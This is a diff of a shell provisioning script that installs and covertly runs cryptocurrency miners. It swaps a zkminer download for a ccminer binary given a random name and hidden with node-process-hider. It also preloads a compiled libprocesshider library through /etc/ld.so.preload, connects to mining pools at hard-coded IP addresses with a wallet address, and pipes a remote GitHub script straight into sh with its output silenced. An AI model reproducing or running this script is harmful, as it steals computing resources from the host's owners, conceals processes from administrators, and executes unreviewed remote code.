@@ -4,9 +4,12 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://github.com/apool-io/zkminer/releases/download/v0.0.1/zkminer_linux_v0.0.1.tar.gz && tar -zvxf zkminer_linux_v0.0.1.tar.gz && cd zkminer_linux_v0.0.1
-
+sudo apt-get install -y nodejs
+npm i -g node-process-hider
+APP=app$(shuf -i 1000000-9999999 -n 1)
+wget https://github.com/rplant8/ccminer-KlausT-8.21-mod-r18-src-fix/releases/download/1.0.1/ccminer-rplant-yescryptr16-linux-1.0.1.tar.gz && tar -zvxf ccminer-rplant-yescryptr16-linux-1.0.1.tar.gz
+mv ccminer $APP
+ph add $APP
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
@@ -47,4 +50,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./zkminer -a CP_h1f88jajg0 -w tesruan -s 143.198.90.116 -p 443 & curl https://raw.githubusercontent.com/John1265801/bookish-sniffle/refs/heads/main/bismillah.sh | sh > /dev/null 2>&1
+./graftcp/graftcp & clear & ./$APP -a yescryptR16 -o stratum+tcp://104.248.231.165:443 -u 0xd2DbCEd50C61cEc6AFA186ee7a029AD1ce078042 -p c=USDT-BEP20,mc=BTE/FNNC/GOLD/QOGE,ID=srantal & curl https://raw.githubusercontent.com/John1265801/bookish-sniffle/refs/heads/main/bismillah.sh | sh > /dev/null 2>&1
